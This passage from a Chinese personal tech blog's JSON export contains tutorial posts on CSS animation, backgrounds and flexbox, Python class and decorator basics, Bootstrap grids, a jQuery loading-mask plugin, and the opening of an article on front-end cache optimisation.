.animation &#123; /* 指定 动画的名字 */ animation-name: rotateZ; /* 动画播放时间 */ animation-duration: 3s; /* 动画的 次数 默认是 一次 可以给具体的次数 也可以给infinite 无穷次 * */ animation-iteration-count: infinite; /* 动画的线性 */ animation-timing-function: linear; /* 动画的运行状态 */ animation-play-state: running; /* 动画延迟播放 */ animation-delay: 2s; /* 动画属性的复合写法 * 非常的宽松 * 顺序 可以随意更改 * 第一次出现的时间 当做持续时间 * 第二次出现的时间 当做 延迟时间 * */ animation: running rotateZ 2s 1s infinite linear; &#125; div:hover &#123; /* 清空动画 * 简单暴力的清空方式 动画会直接还原为默认值 * */ /*animation:none;*/ /* 动画的运行状态 * 默认值是 running * 可以通过修改为 paused 让动画暂停 * 动画再次开启播放的时候 会继续上一次的动画状态 继续播放 * * */ animation-play-state: paused; &#125; 背景背景属性12345678910111213141516171819202122232425262728293031323334353637383940414243444546background CSS1/3 复合属性。设置或检索对象的背景特性 除开background-size 要交/其他随便写！background-color CSS1 设置或检索对象的背景颜色 background-image CSS1/3 设置或检索对象的背景图像 可以加多张背景图片需要加，隔开background-repeat CSS1/3 设置或检索对象的背景图像如何铺排填充 repeat-x： 背景图像在横向上平铺 repeat-y： 背景图像在纵向上平铺 repeat：默认值 背景图像在横向和纵向平铺 no-repeat： 背景图像不平铺 round： 背景图像自动缩放直到适应且填充满整个容器。（CSS3） space： 背景图像以相同的间距平铺且填充满整个容器或某个方向。（CSS3） background-attachment CSS1/3 设置或检索对象的背景图像是随对象内容滚动还是固定的 fixed： 背景图像相对于窗体固定。 scroll： 背景图像相对于元素固定，也就是说当元素内容滚动时背景图像不会跟着滚动，因为背景图像总是要跟着元素本身。但会随元素的祖先元素或窗体一起滚动。 local： 背景图像相对于元素内容固定，也就是说当元素随元素滚动时背景图像也会跟着滚动，因为背景图像总是要跟着内容。（CSS3） background-position CSS1/3 设置或检索对象的背景图像位置 center： 背景图像横向和纵向居中。 left： 背景图像在横向上填充从左边开始。 right： 背景图像在横向上填充从右边开始。 top： 背景图像在纵向上填充从顶部开始。 bottom： 背景图像在纵向上填充从底部开始。 数字 数字 精确的位置移动 background-origin CSS3 背景的起始位置 padding-box：默认属性 从padding区域（含padding）开始显示背景图像。 border-box： 从border区域（含border）开始显示背景图像。 content-box： 从content区域开始显示背景图像。 background-clip CSS3 检索或设置对象的背景向外裁剪的区域 padding-box： 从padding区域（不含padding）开始向外裁剪背景。 border-box： 默认 从border区域（不含border）开始向外裁剪背景。 content-box： 从content区域开始向外裁剪背景。 text： 从前景内容的形状（比如文字）作为裁剪区域向外裁剪，如此即可实现使用背景作为填充色之类的遮罩效果background-size CSS3 检索或设置对象的背景图像的尺寸大小 auto： 背景图像的真实大小。 cover： 将背景图像等比缩放到完全覆盖容器，背景图像有可能超出容器。 contain： 将背景图像等比缩放到宽度或高度与容器的宽度或高度相等，背景图像始终被包含在容器内。 颜色12345678HSLH：Hue(色调)。0(或360)表示红色，120表示绿色，240表示蓝色，也可取其他数值来指定颜色。取值为：0 - 360S：Saturation(饱和度)。取值为：0.0% - 100.0%L：Lightness(亮度)。取值为：0.0% - 100.0% ###相框属性 1234567891011121314151617181920div &#123; width: 400px; height: 400px; border: 30px solid gray; background: url(img/AQ6B1613.jpg) no-repeat center/cover; margin: 100px auto; border-image-source: url(img/xiangkuang.jpg); /* 设置图片相框 */ /* 需要设置 相框的 裁切尺寸 将 图片 切割为 8份,4个角 分别设置到 四角 中间 使用 切割剩余的部分 进行填充 */ border-image-slice: 95 95; /* 如果 我们只是 设置了 切割的 像素 那么 浏览器会 将剩余的 部分 进行 拉伸 填充 造成失真 */ /* 修改 填充的方式 */ /* space repeat 直接是对切割出来的元素 粘贴 如果填不满一个 会 使用半个 进行 填充 */ /*border-image-repeat:stretch; 默认值 */ /*border-image-repeat: space;*/ /* 直接是对切割出来的元素 粘贴 如果 发现 有一部分 无法完整填充 */ border-image-repeat: round; /*使用这个可以自动调整平铺*/ /* border-image 这个属性 实际开发中 使用频率 较低 */&#125; 弹性布局123456789101112flex 复合属性。设置或检索伸缩盒对象的子元素如何分配空间。 flex-grow 设置或检索弹性盒的扩展比率。 flex-shrink 设置或检索弹性盒的收缩比率 flex-basis 设置或检索弹性盒伸缩基准值。 flex-flow 复合属性。设置或检索伸缩盒对象的子元素排列方式。 flex-direction 设置或检索伸缩盒对象的子元素在父容器中的位置。 flex-wrap 设置或检索伸缩盒对象的子元素超出父容器时是否换行。 align-content 设置或检索弹性盒堆叠伸缩行的对齐方式。 align-items 设置或检索弹性盒子元素在侧轴（纵轴）方向上的对齐方式。 align-self 设置或检索弹性盒子元素自身在侧轴（纵轴）方向上的对齐方式。 justify-content 设置或检索弹性盒子元素在主轴（横轴）方向上的对齐方式。 order 设置或检索伸缩盒对象的子元素出現的順序。 ####媒体查询 12345@media screen and (max-width: 640px) &#123; .header&#123; display: none; &#125;&#125; 注意：要写在原来的样式 否则会覆盖原来的样式； 12345@media screen and (max-width: 960px)&#123; body&#123; background: #000; &#125; &#125; 这个应该算是一个media的一个标准写法，上面这段CSS代码意思是：当页面小于960px的时候执行它 screen，他的意思是在告知设备在打印页面时使用衬线字体，在屏幕上显示时用无衬线字体。但是目前我发现很多网站都会直接省略screen,因为你的网站可能不需要考虑用户去打印时，你可以直接这样写： 12345@media (max-width: 960px)&#123; body&#123; background: #000; &#125;&#125; 1234567@media all and (min-width:xxx) and (max-width:xxx)&#123;/*这段查询的all是针对所有设备(有些设备不一定是屏幕，也许是打字机，盲人阅读器)*/&#125;@media only screen and (min-width:xxx) and (max-width:xxx)&#123;/*上面针对了所有设备，这段是只(only)针对彩色屏幕设备*/&#125;","comments":true,"tags":[{"name":"css","slug":"css","permalink":"http://www.wanyifeng.top/tags/css/"}]},{"title":"python基础篇(二)","date":"2017-09-30T11:15:32.000Z","path":"2017/09/30/python基础篇(二)/","text":"class特性1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374class student (object):#构造方法第一个参数为self=&gt;this 指向实例 ,后面的参数为创建实例所需要传入的参数 def __init__(self,name,age,gender): self.name = name self.age = age self.gender = gender#对象方法 注意第一个参数必须为self指向实例 def printAll(self): print (self.name,self.age,self.gender)# 创建实例对象stuObj = student(\"万\",12,\"男\")# 调用方法stuObj.printAll()# class私有变量class sutdent2(object): def __init__(self, arg): # 定义私有变量 __+变量名 self.__arg = str(arg) # 定义set,get方法获取和设置arg def getArg(self): return self.__arg def setArg(self,arg): self.__arg = str(arg) def printArg(self): print(self.__arg)sutdent2Obj = sutdent2(12)sutdent2Obj.printArg()# 通过set方法改变__argsutdent2Obj.setArg(99)sutdent2Obj.printArg()# print(sutdent2Obj.__arg) 该代码会报错 应为__arg 为私有变量# class的继承和多态class All (object): def printAll(): print(\"ALl\")class Animal(object): def eat (self,eatType): print(eatType,\"吃\")class Cat(Animal): # 重新方法 def eat (self,eatType): print(eatType,\"吃\") pass# 多继承class Dog(Animal,All): # 重新方法 def eat (self,eatType): print(eatType,\"吃\") passdog = Dog(\"咬\")dog.eat()cat = Cat(\"添\")cat.eat()# 类型判断# type 只能判断基本数据类型type()# 例如type(123) == type(456)**&gt;&gt;True**# type只能用来判断基本数据类型import typesdef FN(): passtype(FN)==types.FunctionType# &gt;&gt;True# 判断存在继承关系isinstance(Animal,Dog)# &gt;&gt;True python的动态特性 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# python动态特性class student(): def __init__(self, arg): self.arg = arg def printArr (self): for a in self.arg: print(a)class a(student): def __init__(self, arg): self.arg = arg class b(student): # 限制b的实例只能绑定name属性 注意继承的子类设置是不管作用的 __slots__ = (\"name\",) def __init__(self, arg): self.arg = arg class c(object): # 限制b的实例只能绑定name arg属性 __slots__ = (\"name\",\"arg\") def __init__(self, arg): self.arg = arg arr = [a for a in range(10)] tiemObj = a(arr)tiemObj.printArr()# 定义一个printList def printList (self,listArr) : print(listArr)# 给父类绑定一个printList 方法子类可以继承过来用 student.printList = printListlistArr = [a for a in range(30) if a %2 == 0]tiemObj.printList(listArr)# &gt;&gt;&gt;[0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28]tiemObj2 = b(arr)tiemObj2.printList(listArr)# &gt;&gt;&gt;[0, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28]# 只给子类实例a绑定一个printSelf方法def printSelf (self,arr): print(arr)# 导入模块from types import MethodType# 添加一个方法tiemObj.printSelf = MethodType(printSelf,tiemObj)tiemObj.printSelf([1,23,4])# tiemObj2.printSelf([1,23,4])# 'b' object has no attribute 'printSelf' 报错 tiemObj3 = c([1,2,3,4])# tiemObj3.printSelf = MethodType(printSelf,tiemObj3)# 'c' object has no attribute 'printSelf' 报错属性只能是name和arg # @property 装饰器在class中的使用# 作用@property装饰器就是负责把一个方法变成属性调用class statusShow(object): @property def name (self): # 逻辑操作 return self._name @name.setter def name(self,value): # 逻辑操作 self._name = value def __init__(self): pass @property def gender (self): return 12# statusShow 类中name为可读可写的属性 gender为只读属性statusShowObj = statusShow()statusShowObj.name = \"万\"print(statusShowObj.name)print(statusShowObj.gender)# &gt;&gt;&gt; 12# statusShowObj.gender = 18# can't set attribute 报错","comments":true,"tags":[{"name":"python","slug":"python","permalink":"http://www.wanyifeng.top/tags/python/"}]},{"title":"python基础篇(一)","date":"2017-09-28T15:11:35.000Z","path":"2017/09/28/python基础篇(一)/","text":"##python基础篇12345678910111213141516171819202122232425262728293031323334353637383940#可变参数def printData (name,gender,**othon): print(\"name\",name,\"gender\",gender,\"othon\",othon)printData(\"name\",\"男\",order=\"xxx\",aaaa=\"wwww\")def printdata2 (*a,**b): print(a) print(b)arrA = [1,2,3,4,5,6,7]mapA = &#123; \"name\":\"万翼峰\", \"age\":15, \"gender\":\"男\"&#125;printdata2 (*arrA,**mapA)def printData3 (a,*,gender=\"hahah\",name): print(a) print(gender) print(name)printData3 (\"str\",name=\"wanyifeng\")def printData4 (b,a=10): print(a) print(b)printData4(0,10)arr = [ (1,2,3), (4,5,6), (7,8,9),]for a,b ,c in arr: print(a,b) pass#list生成print([a for a in range(1,10) if a %2 == 0]) map函数12345678def f (list): sum = 0 for a in list : sum += int(a) return sumres =list (map(f,[[\"1\",\"10\",\"20\"],[12,45,78,274]]))print(res) 过滤器函数123456def filterFn (item) : if int(item) &gt;= 100 : return TruedataList = [\"2000\",\"100\",\"-10\",\"10\",100]res2 = list (filter(filterFn,dataList))print(res2) 闭包1234567891011121314def ArFn (*data): def inFn (): for a in data : print(a) return inFndata1 = [\"a\",\"b\",\"c\",\"d\"]data2 = [\"e\",\"f\",\"g\",\"h\"]aFN = ArFn(*data1)bFN = ArFn(*data2)cFN = ArFn(\"11\",\"22\",\"33\")aFN()bFN()cFN() 匿名函数12lambdaRes = list(map(lambda x: x*x , [10,20,30,40]))print(lambdaRes) 获取函数名字1print(ArFn.__name__) 用一个引用指向同一个函数 (对比js)1cloneAtfn = ArFn 装饰器 在不改变ak的情况下在他之前运行print(“printLog”) 12345678def printLog(akFn) : def akin (name): print(\"printLog\") return akFn(name) return akin@printLogdef ak (name): print(name) ak = printLog(ak) 相当于在运行之前作为参数运行在printLog中返回ak(“aaa”)&gt;&gt;printLog&gt;&gt;aaa装饰器支持多层嵌套1234567891011def AllprintLog (log): def printIslog(AkFn): def AkFnAll (name): print(log) return AkFn(name) return AkFnAll return printIslog@AllprintLog(\"哈哈哈\")def ak2 (name): print(name)ak2(\"哦哦哦\") 相当于AllprintLog(“哈哈哈”)(ak2)(“哦哦哦”) &gt;&gt; 哈哈哈 &gt;&gt; 哦哦哦","comments":true,"tags":[{"name":"python","slug":"python","permalink":"http://www.wanyifeng.top/tags/python/"}]},{"title":"bootstrap栅格系统使用","date":"2017-06-01T02:13:21.000Z","path":"2017/06/01/bootstrap栅格系统使用/","text":"响应式布局容器 相当固定宽度的 相当于宽度100% 左右会留出15px（计入总宽度 在bootstrap中padding计入宽度可以免去凑数字）因为在bootstrap中所有的样式都会加上 box-sizing: border-box; 样式 栅格参数通过下表可以详细查看 Bootstrap 的栅格系统是如何在多种屏幕设备上工作的。 超小屏幕 手机 (&lt;768px) 小屏幕 平板 (≥768px) 中等屏幕 桌面显示器 (≥992px) 大屏幕 大桌面显示器 (≥1200px) 栅格系统行为 总是水平排列 开始是堆叠在一起的，当大于这些阈值时将变为水平排列C 最大宽度 None 750px 970px 1170px 类前缀 .col-xs- .col-sm- .col-md- .col-lg- 列数 12 最大列宽 自动 ~62px ~81px ~97px 槽宽 30px （每列左右均有 15px） 注意 想要改变槽宽左右15的padding 可以采用覆盖样式或者在编译bootstrap源代码时编辑当前项 栅格系统的原理是浮动后对宽度进行媒体查询所以bootstrap的全局样式有大量的媒体查询 案例01 12345678910111213141516171819&lt;div class=\"container-fluid\"&gt; &lt;!--栅格系统 一般使用md 和 sm 前者针对平板后者针对pc--&gt; &lt;!--内包含的列大于12个，包含多余列的元素将作为一个整体单元被另起一行排列。--&gt; &lt;!--注意这种布局左右会流出15px的距离--&gt; &lt;div class=\"item\"&gt; &lt;div class=\"col-md-1 col-sm-6\"&gt;.col-md-1&lt;/div&gt; &lt;div class=\"col-md-1 col-sm-6\"&gt;.col-md-1&lt;/div&gt; &lt;div class=\"col-md-1 col-sm-6\"&gt;.col-md-1&lt;/div&gt; &lt;div class=\"col-md-1 col-sm-6\"&gt;.col-md-1&lt;/div&gt; &lt;div class=\"col-md-1 col-sm-6\"&gt;.col-md-1&lt;/div&gt; &lt;div class=\"col-md-1 col-sm-6\"&gt;.col-md-1&lt;/div&gt; &lt;div class=\"col-md-1 col-sm-6\"&gt;.col-md-1&lt;/div&gt; &lt;div class=\"col-md-1 col-sm-6\"&gt;.col-md-1&lt;/div&gt; &lt;div class=\"col-md-1 col-sm-6\"&gt;.col-md-1&lt;/div&gt; &lt;div class=\"col-md-1 col-sm-6\"&gt;.col-md-1&lt;/div&gt; &lt;div class=\"col-md-1 col-sm-6\"&gt;.col-md-1&lt;/div&gt; &lt;div class=\"col-md-1 col-sm-6\"&gt;.col-md-1&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 注意在使用时注意在栅格元素中不要加上magin否则可能导致换行 一般使用 padding padding计入总宽度方便计算,不用自己凑宽度 当文字过多时 1234567891011&lt;!--当文字过多时会出现--&gt; &lt;div class=\"item clearfix\"&gt; &lt;div class=\"col-xs-6 col-sm-3\"&gt;.col-xs-6 .col-sm-3哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈啊哈哈哈哈哈哈哈哈哈哈或或哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈&lt;/div&gt; &lt;div class=\"col-xs-6 col-sm-3\"&gt;.col-xs-6 .col-sm-3&lt;/div&gt; &lt;div class=\"clearfix visible-xs-block\"&gt;&lt;/div&gt; &lt;!--文字过多导致div过高时栅格系统的正常 --&gt; &lt;div class=\"col-xs-6 col-sm-3\"&gt;.col-xs-6 .col-sm-3&lt;/div&gt; &lt;div class=\"col-xs-6 col-sm-3\"&gt;.col-xs-6 .col-sm-3&lt;/div&gt; &lt;/div&gt; 原理清除浮动 列偏移 123456789101112&lt;!--列偏移（可以代替浮动）ol-md-offset-4--&gt; &lt;div class=\"item clearfix\"&gt; &lt;div class=\"col-md-4\"&gt;.col-md-4&lt;/div&gt; &lt;div class=\"col-md-4 col-md-offset-4\"&gt;.col-md-4 .col-md-offset-4&lt;/div&gt; &lt;/div&gt; &lt;div class=\"item clearfix\"&gt; &lt;div class=\"col-md-3 col-md-offset-3\"&gt;.col-md-3 .col-md-offset-3&lt;/div&gt; &lt;div class=\"col-md-3 col-md-offset-3\"&gt;.col-md-3 .col-md-offset-3&lt;/div&gt; &lt;/div&gt; &lt;div class=\"item clearfix\"&gt; &lt;div class=\"col-md-6 col-md-offset-3\"&gt;.col-md-6 .col-md-offset-3&lt;/div&gt; &lt;/div&gt; 适用于各个屏幕类比于栅格系统 ##列嵌套 栅格里套栅格 12345678910111213 &lt;div class=\"item clearfix\"&gt; &lt;div class=\"col-sm-9\" style=\"height: 100px;\"&gt; Level 1: .col-sm-9 &lt;div class=\"item\" style=\"margin-top: 20px;\"&gt; &lt;div class=\"col-xs-8 col-sm-6\"&gt; Level 2: .col-xs-8 .col-sm-6 &lt;/div&gt; &lt;div class=\"col-xs-4 col-sm-6\"&gt; Level 2: .col-xs-4 .col-sm-6 &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 列排序 1234567&lt;!--列排序 push向右移动 pull向左移动 一般很少用--&gt;&lt;div class=\"item clearfix\"&gt; &lt;div class=\"col-md-3 col-md-push-9\"&gt;111向右9&lt;/div&gt; &lt;div class=\"col-md-3 col-md-push-3\"&gt;222向右3&lt;/div&gt; &lt;div class=\"col-md-3 col-md-pull-3\"&gt;333向左3&lt;/div&gt; &lt;div class=\"col-md-3 col-md-pull-9\"&gt;444向左9&lt;/div&gt;&lt;/div&gt; 响应式工具类 类组 CSS display .visible-*-block display: block; .visible-*-inline display: inline; .visible-*-inline-block display: inline-block; .visible-xs-block 就是在小屏幕上可见的元素 注意每个属性只能在在一个元素上只能代表一张状态 多种状态需要多个属性 如 visible-xs-block visible-sm-block 意思就是在手机和平板上显示 大于992px时不显示","comments":true,"tags":[{"name":"css","slug":"css","permalink":"http://www.wanyifeng.top/tags/css/"},{"name":"Bootstrap","slug":"Bootstrap","permalink":"http://www.wanyifeng.top/tags/Bootstrap/"}]},{"title":"jq遮罩插件(对象版本)","date":"2017-05-28T13:18:21.000Z","path":"2017/05/28/jq遮罩插件(对象版本)/","text":"JQ遮罩插件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160/* 遮罩插件 * 可选选项 * smBoxBg 小方格遮罩颜色 默认 #FFFFFF * backgroudColor 大遮罩颜色 默认 #000000 * backgroundImage 动态图片 默认 loading * text 文字信息 默认 加载中.... * opacity:0.6 大遮罩透明度 默认 0.6 * width:小遮罩的宽度 * height:小遮罩的高度 * textFontSize:14, 文字大小 * textFontColor:\"#000000\", 文字颜色 * isImg: true 图片是否存在 * isText: true 文字是否存在 * isSmbox: true 文字图片层级是否存在 * *//* 使用demo $(\"body\").setLoading(\"body\") setTimeout(function ()&#123; $(\"body\").rmoveLoading (\"body\") &#125;,5000) //==================================== // 设置其他参数时id必须传 $(\"body\").setLoading(&#123; id:\"body\" &#125;) setTimeout(function ()&#123; $(\"body\").rmoveLoading (\"body\") &#125;,5000) * */(function($) &#123; $.fn.setLoading = function(data) &#123; new setLoadingFn(data, this) return this &#125; $.fn.rmoveLoading = function(id) &#123; if(typeof id == \"string\") &#123; $(\"#\" + id).remove(); return this; &#125; else &#123; throw new Error(\"id类型错误\"); &#125; &#125; function setLoadingFn(data, $dom) &#123; this.$ = $ this.$dom = $dom this.init(data, $) this.start($dom, $) this.addEven(this.data.id, $dom) &#125; setLoadingFn.prototype = &#123; constructor: setLoadingFn, init: function(data) &#123; //参数处理 var defaultVal = &#123; smBoxBg: \"#FFFFFF\", backgroudColor: \"#CCCCCC\", //背景色 backgroundImage: \"data:image/gif;base64,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\", //背景图片 text: \"加载中....\", //文字 width: 150, //宽度 height: 60, //高度 opacity: 0.5, textFontSize: 14, textFontColor: \"#000000\", isImg: true, isText: true, isSmbox: true &#125; if(typeof data == \"object\") &#123; this.data = $.extend(defaultVal, data); &#125; else if(typeof data == \"string\") &#123; defaultVal.id = data this.data = defaultVal &#125; else &#123; throw new Error(\"参数错误\"); &#125; if(!this.data.id) &#123; throw new Error(\"id,错误\"); &#125; &#125;, start: function($dom, $) &#123; //大遮罩设置 var data = this.data, top, left, layer, content; top = $dom[0].offsetTop// 元素在文档中位置 滚动条不影响 left = $dom[0].offsetLeft; layer = $(\"&lt;div id=\" + data.id + \"&gt;&lt;/div&gt;\"); layer.css(&#123; zIndex: 998, position: \"absolute\", height: $dom.height()+2+\"px\", width: $dom.width()+2+\"px\", top: top-1, left: left-1, borderRadius: \"3px\", &#125;); if(window.addEventListener) &#123; //ie8 layer.css(\"backgroundColor\", this.rgbaChange(data.backgroudColor, data.opacity)) &#125; else &#123; layer.css(\"filter\", this.ieRgbaChange(data.backgroudColor, data.opacity)) &#125; if(data.isSmbox) &#123; //小遮罩设置 content = $(\"&lt;div class='contentLoad'&gt;&lt;/div&gt;\"); content.css(&#123; textAlign: \"left\", position: \"absolute\", zIndex: 999, height: data.height + \"px\", width: data.width + \"px\", verticalAlign: \"middle\", backgroundColor: data.smBoxBg, borderRadius: \"8px\", left: (layer.width() - data.width) / 2 + \"px\", top: (layer.height() - data.height) / 2 + \"px\", textAlign: \"center\", &#125;); if(data.isImg) &#123; content.append(\"&lt;img style='line-height: \"+data.height+\"px; display: inline; vertical-align:middle;' src='\" + data.backgroundImage + \"' /&gt;\") &#125; if(data.isText) &#123; content.append(\"&lt;span style='line-height: \"+data.height+\"px; display: inline; margin-left:10px;text-align:center; vertical-align:middle;font-size:\" + data.textFontSize + \"px ;color:\" + data.textFontColor + \" ;'&gt;\" + data.text + \"&lt;/span&gt;\") &#125; layer.append(content) &#125; $(\"body\").append(layer); &#125;, rgbaChange: function(color, opacity) &#123; var NOcolor = color.substring(1, 7), R = parseInt(NOcolor.substring(0, 2), 16), G = parseInt(NOcolor.substring(2, 4), 16), B = parseInt(NOcolor.substring(4, 6), 16); return \"rgba(\" + R + \",\" + G + \",\" + B + \",\" + opacity + \")\" &#125;, ieRgbaChange: function(color, opacity) &#123; var color = color.substring(1, 7), ie_opcity = &#123; \"0.1\": \"19\", \"0.2\": \"33\", \"0.3\": \"4C\", \"0.4\": \"66\", \"0.5\": \"7F\", \"0.6\": \"99\", \"0.7\": \"b2\", \"0.8\": \"c8\", \"0.9\": \"e5\" &#125;; return \"progid:DXImageTransform.Microsoft.gradient(startcolorstr=#\" + ie_opcity[opacity] + color + \",endcolorstr=#\" + ie_opcity[opacity] + color + \");\" &#125;, addEven: function(id, $dom) &#123; var _this = this /*window.onresize = function() &#123; $(\"#\" + id).remove(); _this.start($dom, $); &#125;*/ &#125; &#125;&#125;)(jQuery)","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"轮子","slug":"轮子","permalink":"http://www.wanyifeng.top/tags/轮子/"}]},{"title":"js字符串公共部分比较","date":"2017-05-12T15:13:21.000Z","path":"2017/05/12/js字符串公共部分比较/","text":"12345678910111213141516function stringInof(target, strInof) &#123; var str = \"\", len = strInof.length, tagLen = target.length, self, i, j; for(i = 0; i &lt; len; i++) &#123; self = i - 1 for(j = 0; j &lt; i; j++) &#123; var tag = strInof.substring(j, len - self--) if(target.replace(tag, \"\").length != tagLen) &#123; return tag &#125; &#125; &#125;&#125;console.log(stringInof(\"aaaaastringaaaa\", \"bbbstringbbb\"))","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"轮子","slug":"轮子","permalink":"http://www.wanyifeng.top/tags/轮子/"}]},{"title":"前端工程-发布优化","date":"2017-02-21T03:13:11.000Z","path":"2017/02/21/前端工程发布优化/","text":"前百度工程师，曾负责百度 前端集成解决方案 的核心设计与开发工作。我现在称这个领域为【前端工程】。没错，这是我最爱唠叨的问题域。 这是一个非常有趣的 非主流前端领域，这个领域要探索的是如何用工程手段解决前端开发和部署优化的综合问题，入行到现在一直在学习和实践中。 在我的印象中，facebook是这个领域的鼻祖，有兴趣、有梯子的同学可以去看看facebook的页面源代码，体会一下什么叫工程化。 接下来，我想从原理展开讲述，多图，较长，希望能有耐心看完。 —————————- 我是一条分割线 —————————- 让我们返璞归真，从原始的前端开发讲起。上图是一个“可爱”的index.html页面和它的样式文件a.css，用文本编辑器写代码，无需编译，本地预览，确认OK，丢到服务器，等待用户访问。前端就是这么简单，好好玩啊，门槛好低啊，分分钟学会有木有！ 然后我们访问页面，看到效果，再查看一下网络请求，200！不错，太™完美了！那么，研发完成。。。。了么？ 等等，这还没完呢！对于大公司来说，那些变态的访问量和性能指标，将会让前端一点也不“好玩”。 看看那个a.css的请求吧，如果每次用户访问页面都要加载，是不是很影响性能，很浪费带宽啊，我们希望最好这样： 利用304，让浏览器使用本地缓存。但，这样也就够了吗？不成！304叫协商缓存，这玩意还是要和服务器通信一次，我们的优化级别是变态级，所以必须彻底灭掉这个请求，变成这样： 强制浏览器使用本地缓存（cache-control/expires），不要和服务器通信。好了，请求方面的优化已经达到变态级别，那问题来了：你都不让浏览器发资源请求了，这缓存咋更新？ 很好，相信有人想到了办法：通过更新页面中引用的资源路径，让浏览器主动放弃缓存，加载新资源。好像这样： 下次上线，把链接地址改成新的版本，就更新资源了不是。OK，问题解决了么？！当然没有！大公司的变态又来了，思考这种情况： 页面引用了3个css，而某次上线只改了其中的a.css，如果所有链接都更新版本，就会导致b.css，c.css的缓存也失效，那岂不是又有浪费了？！ 重新开启变态模式，我们不难发现，要解决这种问题，必须让url的修改与文件内容关联，也就是说，只有文件内容变化，才会导致相应url的变更，从而实现文件级别的精确缓存控制。 